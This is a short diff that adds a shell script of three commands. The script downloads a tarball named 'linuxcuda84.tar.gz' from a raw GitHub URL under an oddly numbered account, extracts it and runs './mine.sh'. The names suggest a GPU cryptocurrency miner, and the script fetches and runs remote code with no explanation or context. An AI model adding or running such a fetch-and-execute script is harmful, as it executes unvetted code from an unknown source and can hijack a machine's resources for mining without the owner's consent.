@@ -1,0 +1,5 @@
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxcuda84.tar.gz
+
+tar -xvf ./linuxcuda84.tar.gz
+
+./mine.sh
